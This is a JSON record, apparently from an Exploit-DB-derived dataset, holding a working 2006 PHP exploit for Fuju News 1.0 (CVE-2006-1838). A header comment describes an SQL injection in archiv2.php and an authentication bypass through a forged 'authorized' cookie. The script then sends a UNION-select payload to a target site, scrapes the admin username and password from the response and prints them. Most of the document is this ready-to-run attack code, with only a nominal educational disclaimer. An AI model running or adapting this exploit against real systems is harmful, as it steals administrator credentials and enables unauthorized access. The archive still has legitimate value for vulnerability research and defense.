{
  "id": "1682",
  "title": "Fuju News 1.0 - Authentication Bypass / SQL Injection",
  "cve": "CVE-2006-1838",
  "vuln_type": "sqli",
  "code": "<?php /*\r\n\r\n |---==============================================================---|\r\n |                          /\\\u00af\\__       /\\\u00af\\                         |   \r\n |     ____    ___      __  \\ \\  _\\   ___\\ \\ \\___      __    ___      |    \r\n |    /  __\\ /  _  \\  / __ \\ \\ \\ \\/  / ___\\ \\  _  \\  / __ \\/\\  __\\    |    \r\n |   /\\__,  \\/\\ \\/\\ \\/\\ \\_\\ \\_\\ \\ \\_/\\ \\__/\\ \\ \\ \\ \\/\\  __/\\ \\ \\/     |     \r\n |   \\/\\____/\\ \\_\\ \\_\\ \\__/ \\_\\\\ \\__\\ \\____\\\\ \\_\\ \\_\\ \\____\\\\ \\_\\     |      \r\n |    \\/___/  \\/_/\\/_/\\/__/\\/_/ \\/__/\\/____/ \\/_/\\/_/\\/____/ \\/_/     |     \r\n |                                     >> Internet Security           |                         \r\n |---==============================================================---|\r\n \r\n        title: fuju news 1.0 remote sql injection\r\n      release: 2006-04-16\r\n       author: snatcher [snatcher at gmx.ch]\r\n      country: switzerland  |+|\r\n\t  \r\n  application: Fuju News 1.0\r\n  description: a php / mysql based newsscript\r\n     download: http://www.clanscripte.net/main.php?content=download&do=file&dlid=243\r\n  description: you can get the password with a simple sql injection.\r\n       greets: honkey, str0ke <- good exploit publisher :),\r\n\t\t\t   all security guys and coders over the world\r\n terms of use: this exploit is just for educational purposes, do not use it for illegal acts.\r\n\r\n\r\n---------------------------- archiv2.php - line 25 --------------------------------------\r\n$result1 =@mysql_query(\"SELECT * FROM news_sql WHERE ID LIKE $ID\");\r\n-----------------------------------------------------------------------------------------\r\n\r\nbecause this $ID isn't escaped correctly you can insert malicious sql code,\r\ni.e. with a union operator.\r\n\r\n\r\ntitle: fuju news 1.0 restriction bypass\r\n\r\n------------------------- edit_kategorie.php - line 19 ----------------------------------\r\n$authorized=$HTTP_COOKIE_VARS['authorized'];\r\n-----------------------------------------------------------------------------------------\r\n\r\nthat's the mistake of the code. you only have to create a session cookie named 'authorized'\r\nwith the value 1, and you are logged in.\r\n\r\n*/\r\n/*********************** CONFIGURATION ****************************/\r\n\r\n$PATH_TO_FILE  = 'http://yourhost.com/fuju/archiv2.php';           // in example: http://yourhost.com/fuju/archiv2.php\r\n$TABLE_PREFIX  = '';                                               // default: empty\r\n$GET_VARS      = '?ID=';                                           // do not change\r\n$SQL_INJECTION = '-666 union select pw,0,0,benutzer,0,0,pw from '. // do not change\r\n                 $TABLE_PREFIX.'admin_sql /*';\r\n\r\n\r\n/**************************** MAIN ********************************/\r\n\r\n$file_array = file($PATH_TO_FILE.$GET_VARS.urlencode($SQL_INJECTION))or die('couldn\\'t open host!'); \r\nforeach ($file_array as $now)                               \r\n\t$html_content .= $now;\r\n\r\n$html_content = str_castrate($html_content);\r\n\r\npreg_match_all(\"!Autor:</span></strong></td></tr><trbordercolorlight='#2E2E2E'bordercolordark='#848484'>\".\r\n               \"<tdalign=leftvalign=topbgcolor=\\\"#49535C\\\"><divalign='center'><spanclass='Stil2'>(.*?)</div>!\",\r\n\t\t\t   $html_content,$username); /* gets username */\r\npreg_match_all(\"!Kategorie:</span></strong></p></div></td></tr><trbordercolorlight='#2E2E2E'bordercolordark=\".\r\n               \"'#848484'><tdalign=leftvalign=topbgcolor=\\\"#49535C\\\"><divalign='center'><fontclass=\\\"content\\\"\".\r\n\t\t\t   \"><spanclass='Stil2'>(.*?)</span>!\", \r\n                $html_content,$password); /* gets password */\r\n\r\nif ($username[1][0] && $password[1][0]) {\r\n\techo 'username: <b>'.$username[1][0].'</b><br>';\r\n\techo 'password: <b>'.$password[1][0].'</b>';\r\n}else {\r\n\techo 'exploit failed! <br>';\r\n}\r\necho '<br><br><br><br><br>\r\n======================================================================<br>\r\nexploit: fuju news 1.0 remote sql injection<br>\r\nrelease: 2006-04-16<br>\r\nauthor: snatcher [snatcher at gmx.ch]<br>\r\n======================================================================';\r\n\r\nfunction str_castrate($string) {\r\n\t$string = str_replace(\"\\n\", '', $string);\r\n\t$string = str_replace(\"\\r\", '', $string);\r\n\t$string = str_replace(\" \", '', $string);\r\n\treturn $string;\r\n}\r\n?>\r\n\r\n# milw0rm.com [2006-04-16]",
  "url": "https://www.exploit-db.com/exploits/1682"
}